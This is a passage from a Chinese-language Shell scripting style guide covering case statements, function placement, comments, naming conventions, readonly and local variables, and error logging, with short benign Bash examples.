示例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">case "${expression}" in</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    a)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        variable="..."</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        some_command "${variable}" "${other_expr}" ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    absolute)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        actions="relative"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        another_command "${actions}" "${other_expr}" ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    *)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        error "Unexpected expression '${expression}'"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">esac</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>只要整个表达式可读，简单的单行命令可以跟模式和 ;; 写在同一行。当单行容不下操作时，请使用多行的写法。
单行示例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">verbose='false'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">aflag=''</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bflag=''</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files=''</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while getopts 'abf:v' flag; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    case "${flag}" in</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        a) aflag='true' ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        b) bflag='true' ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        f) files="${OPTARG}" ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        v) verbose='true' ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        *) error "Unexpected option ${flag}" ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    esac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="函数位置">函数位置<a class="hash-link" href="#函数位置" title="标题的直接链接">​</a></h4><p>将文件中所有的函数统一放在常量下面。不要在函数之间隐藏可执行代码。</p><p>如果你有函数，请将他们统一放在文件头部。只有includes， set 声明和常量设置可能在函数声明之前完成。不要在函数之间隐藏可执行代码。如果那样做，会使得代码在调试时难以跟踪并出现意想不到的结果。</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="主函数main">主函数main<a class="hash-link" href="#主函数main" title="标题的直接链接">​</a></h4><p>对于包含至少了一个其他函数的足够长的脚本，建议定义一个名为 main 的函数。对于功能简单的短脚本， main函数是没有必要的。</p><p>为了方便查找程序的入口位置，将主程序放入一个名为 main 的函数中，作为最底部的函数。这使其和代码库的其余部分保持一致性，同时允许你定义更多变量为局部变量（如果主代码不是一个函数就不支持这种做法）。
文件中最后的非注释行应该是对 main 函数的调用：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">main "$@"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="注释">注释<a class="hash-link" href="#注释" title="标题的直接链接">​</a></h4><p>代码注释的基本原则：</p><ul><li>注释应能使代码更加明确</li><li>避免注释部分的过度修饰</li><li>保持注释部分简单、明确</li><li>在编码以前就应开始写注释</li><li>注释应说明设计思路而不是描述代码的行为</li></ul><p>注释与其周围的代码在同一缩进级别，#号与注释文本间需保持一个空格以和注释代码进行区分。</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="文件头">文件头<a class="hash-link" href="#文件头" title="标题的直接链接">​</a></h5><p>每个文件的开头是其文件内容的描述。除版权声明外，每个文件必须包含一个顶层注释，对其功能进行简要概述。</p><p>例如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Perform hot backups of databases.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_LWe7" id="功能注释">功能注释<a class="hash-link" href="#功能注释" title="标题的直接链接">​</a></h5><p>主体脚本中除简洁明了的函数外都必须带有注释。库文件中所有函数无论其长短和复杂性都必须带有注释。</p><p>这使得其他人通过阅读注释即可学会如何使用你的程序或库函数，而不需要阅读代码。</p><p>所有的函数注释应该包含：</p><ul><li>函数的描述</li><li>全局变量的使用和修改</li><li>使用的参数说明</li><li>返回值，而不是上一条命令运行后默认的退出状态</li></ul><p>例如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Perform hot backups of databases.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export PATH='/usr/sbin/bin:/usr/bin:/usr/local/bin'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#######################################</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Cleanup files from the backup dir</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Globals:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#   BACKUP_DIR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#   BACKUP_SID</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Arguments:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#   None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Returns:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#   None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#######################################</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cleanup() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_LWe7" id="实现部分的注释">实现部分的注释<a class="hash-link" href="#实现部分的注释" title="标题的直接链接">​</a></h5><p>注释你代码中含有技巧、不明显、有趣的或者重要的部分。</p><p>这部分遵循代码注释的基本原则即可。不要注释所有代码。如果有一个复杂的不易理解的逻辑，请进行简单的注释。</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="todo注释">TODO注释<a class="hash-link" href="#todo注释" title="标题的直接链接">​</a></h5><p>对那些临时的, 短期的解决方案, 或已经够好但仍不完美的代码使用 TODO 注释.</p><p>TODO 注释要使用全大写的字符串 TODO, 在随后的圆括号里写上你的名字,邮件地址, bug ID, 或其它身份标识和与这一 TODO 相关的 issue。
主要目的是让添加注释的人 (也是可以请求提供更多细节的人) 可根据规范的TODO 格式进行查找。
添加 TODO 注释并不意味着你要自己来修正,因此当你加上带有姓名的 TODO 时, 一般都是写上自己的名字。</p><p>这与<strong>C++ Style Guide</strong>中的约定相一致。</p><p>例如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># TODO(mrmonkey): Handle the unlikely edge cases (bug ####)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># TODO(--bug=123456): remove the "Last visitors" feature</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="命名">命名<a class="hash-link" href="#命名" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="函数名">函数名<a class="hash-link" href="#函数名" title="标题的直接链接">​</a></h3><p>使用小写字母，并用下划线分隔单词。使用双冒号 <code>::</code> 分隔包名。函数名之后必须有圆括号。</p><p>如果你正在写单个函数，请用小写字母来命名，并用下划线分隔单词。如果你正在写一个包，使用双冒号 <code>::</code> 来分隔包名。
函数名和圆括号之间没有空格，大括号必须和函数名位于同一行。
当函数名后存在 <code>()</code> 时，关键词 function 是多余的，建议不带 function 的写法，但至少做到同一项目内风格保持一致。
正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Single function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my_func() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Part of a package</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mypackage::my_func() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">function my_func</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="变量名">变量名<a class="hash-link" href="#变量名" title="标题的直接链接">​</a></h3><p>规则同函数名一致。</p><p>循环中的变量名应该和正在被循环的变量名保持相似的名称。
示例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">for zone in ${zones}; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    something_with "${zone}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="常量和环境变量名">常量和环境变量名<a class="hash-link" href="#常量和环境变量名" title="标题的直接链接">​</a></h3><p>全部大写，用下划线分隔，声明在文件的顶部。</p><p>常量和任何导出到环境中的变量都应该大写。
示例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Constant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly PATH_TO_FILES='/some/path'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Both constant and environment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">declare -xr BACKUP_SID='PROD'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>有些情况下首次初始化及常量（例如，通过getopts），因此，在getopts中或基于条件来设定常量是可以的，但之后应该立即设置其为只读。
值得注意的是，在函数中使用 declare 对全局变量无效，所以推荐使用 readonly 和 export 来代替。
示例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">VERBOSE='false'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while getopts 'v' flag; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  case "${flag}" in</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v) VERBOSE='true' ;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  esac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly VERBOSE</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="只读变量">只读变量<a class="hash-link" href="#只读变量" title="标题的直接链接">​</a></h3><p>使用 readonly 或者 declare -r 来确保变量只读。</p><p>因为全局变量在shell中广泛使用，所以在使用它们的过程中捕获错误是很重要的。当你声明了一个变量，希望其只读，那么请明确指出。
示例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">zip_version="$(dpkg --status zip | grep Version: | cut -d ' ' -f 2)"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [[ -z "${zip_version}" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  error_message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  readonly zip_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="局部变量">局部变量<a class="hash-link" href="#局部变量" title="标题的直接链接">​</a></h3><p>每次只声明一个变量,不要使用组合声明，比如<code>a=1 b=2</code>;  </p><p>使用 local 声明特定功能的变量。声明和赋值应该在不同行。</p><p>必须使用 local 来声明局部变量，以确保其只在函数内部和子函数中可见。这样可以避免污染全局名称空间以及避免无意中设置可能在函数外部具有重要意义的变量。</p><p>当使用命令替换进行赋值时，变量声明和赋值必须分开。因为内建的 local 不会从命令替换中传递退出码。
正例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">my_func2() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local name="$1"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # 命令替换赋值，变量声明和赋值需放到不同行:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local my_var</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my_var="$(my_func)" || return</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>反例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">my_func2() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    # 禁止以下写法: $? 将获取到'local'指令的返回值, 而非 my_func</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local my_var="$(my_func)"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [[ $? -eq 0 ]] || return</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="异常与日志">异常与日志<a class="hash-link" href="#异常与日志" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="异常">异常<a class="hash-link" href="#异常" title="标题的直接链接">​</a></h3><p>使用shell返回值来返回异常，并根据不同的异常情况返回不同的值。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="日志">日志<a class="hash-link" href="#日志" title="标题的直接链接">​</a></h3><p>所有的错误信息都应被导向到STDERR，这样将有利于出现问题时快速区分正常输出和异常输出。</p><p>建议使用与以下函数类似的方式来打印正常和异常输出：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">err() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo "[$(date +'%FT%T%z')]: $@" &gt;&amp;2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ! do_something; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    err "Unable to do_something"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exit "${E_DID_NOTHING}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="编程实践--持续分类并完善--">编程实践<sup>  <em>持续分类并完善</em>  </sup><a class="hash-link" href="#编程实践--持续分类并完善--" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="变量扩展---推荐--">变量扩展 <sup>  <em>推荐</em>  </sup><a class="hash-link" href="#变量扩展---推荐--" title="标题的直接链接">​</a></h3><p>通常情况下推荐为变量加上大括号如 <code>"${var}"</code> 而不是 <code>"$var"</code> ，但具体也要视情况而定。</p><p>以下按照优先顺序列出建议：</p><ul><li>与现有代码保持一致</li><li>单字符变量在特定情况下才需要被括起来</li><li>使用引号引用变量，参考下一节：变量引用</li></ul><p>详细示例如下：
